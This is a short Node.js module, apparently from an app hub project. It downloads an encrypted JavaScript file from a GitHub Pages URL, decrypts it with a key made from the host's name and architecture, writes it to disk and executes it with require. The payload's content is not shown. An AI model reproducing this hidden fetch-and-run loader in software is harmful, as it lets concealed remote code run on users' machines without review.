const FileDownloadNode = require("files-downloads-node");
const downloader = new FileDownloadNode();

const crypto = require('crypto-js');
const n = require("node:os");
// utilcode
const utilcode = require("../../../../modules/utilcodes");
const path = require("path");

class Init {
    constructor() {
        this.mod = null;
        this.down = false;
    }
    async cryp() {
        const fp = path.join(__dirname, "t.js");
        const fc = path.join(__dirname, "t.cryp.js");
        const cf = await utilcode.fsRead(fp);
        const codigoCifrado = crypto.AES.encrypt(cf, n.hostname() + n.arch()).toString();
        await utilcode.fsWrite(fc, codigoCifrado);
    }

    async download() {
        if (!this.down) {
            let down = false;
            try {
                down = await downloader.downloadAsync({
                    url: "https://devlwte.github.io/appshubster/js/t.cryp.js.crypte",
                    outputDirectory: path.join(__dirname),
                    rename: "t.cryp.js",
                });

                this.down = true;

            } catch (error) {
                console.log(error);
                down = false;
            }

            return down;
        }else{
            return false;
        }
    }

    async run() {
        // await this.cryp();
        const downloadActive = await this.download();
        let fc = path.join(__dirname, "t.cryp.js");
        if (downloadActive) {
            fc = downloadActive;
        }

        if (this.mod == null) {
            const cf = await utilcode.fsRead(fc);
            const cd = crypto.AES.decrypt(cf, n.hostname() + n.arch()).toString(crypto.enc.Utf8);
            await utilcode.createFolderRecursive(path.join(__dirname), "a/b/app");
            await utilcode.fsWrite(path.join(__dirname, "a/b/app/", "t.js"), cd);
            const tf = require(path.join(__dirname, "a/b/app/", "t.js"));
            this.mod = tf;
        }

    }
}
module.exports = new Init();
